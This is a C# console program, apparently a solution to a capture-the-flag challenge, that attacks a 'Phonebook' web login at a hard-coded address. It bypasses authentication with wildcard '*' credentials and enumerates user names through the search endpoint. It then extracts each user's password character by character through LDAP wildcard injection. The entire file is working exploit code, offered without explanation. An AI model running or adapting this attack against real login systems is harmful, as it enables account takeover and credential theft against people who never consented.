using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace PhoneBook
{
    public static class Program
    {
        static List<string> userNames = new List<string>();
        static CookieContainer cookieContainer = new CookieContainer();
        private static async Task Main()
        {
            var baseAddress = new Uri("http://157.245.46.136:32609/");
            HttpClientHandler handler = new HttpClientHandler()
            {
                CookieContainer = cookieContainer,
            };
            HttpClient client = new HttpClient(handler) { BaseAddress = baseAddress };

            var values = new Dictionary<string, string>
        {
              { "username", "*" },
              { "password", "*" }
        };

            var content = new FormUrlEncodedContent(values);
            //Post request to login 
            await (await client.PostAsync("/login", content)).Content.ReadAsStringAsync();

            //Get all users and save their first and last name in userNames list
            for (char c = 'A'; c <= 'Z'; c++)
            {
                await FindUsersAsync(client, c);
            }
            //try this names and try to brute force password
            foreach (var userName in userNames)
            {
                if (await TryUserNameAsync(client, userName))
                {
                    Console.WriteLine($"User exists {userName}");
                    string pwd = await BruteForceUserAsync(client, userName);
                    Console.WriteLine($"Password found {pwd}");
                }
                else
                    Console.WriteLine($"User does not exists: {userName}");
            }
        }
        static async Task FindUsersAsync(HttpClient client, char letter)
        {
            string myJson = "{\"term\": \"" + letter + "\"}";
            string response = await (await client.PostAsync("/search", new StringContent(myJson, Encoding.UTF8, "application/json"))).Content.ReadAsStringAsync();
            var serializeOptions = new JsonSerializerOptions
            {
                PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
            };
            var users = JsonSerializer.Deserialize<List<UserInfo>>(response, serializeOptions);
            foreach (var user in users)
            {
                if (userNames.Contains(user.Cn))
                    continue;
                userNames.Add(user.Cn);
                userNames.Add(user.Sn);
            }
        }
        static async Task<bool> TryUserNameAsync(HttpClient client, string userName)
        {
            var values = new Dictionary<string, string> {
            { "username", userName },
            { "password", "*" },
        };
            var content = new FormUrlEncodedContent(values);
            string respone = await (await client.PostAsync("/login", content)).Content.ReadAsStringAsync();
            return !respone.Contains("Phonebook - Login");
        }
        static async Task<string> BruteForceUserAsync(HttpClient client, string userName)
        {
            string s = "";
            bool isDone = false;
            while (!isDone)
            {
                isDone = true;
                foreach (var c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&_-+={[}]|:<,>")
                {
                    if (!await TryPasswordAsync(client, userName, s + c))
                        continue;
                    isDone = false;
                    s += c;
                    Console.WriteLine($"password :{s}");
                }
            }
            return s;
        }
        static async Task<bool> TryPasswordAsync(HttpClient client, string userName, string pwd)
        {
            cookieContainer = new CookieContainer();
            var values = new Dictionary<string, string> {
            { "username", userName },
            { "password", pwd+"*" },
        };
            var content = new FormUrlEncodedContent(values);
            string respone = await (await client.PostAsync("/login", content)).Content.ReadAsStringAsync();
            return !respone.Contains("Phonebook - Login");
        }
    }
}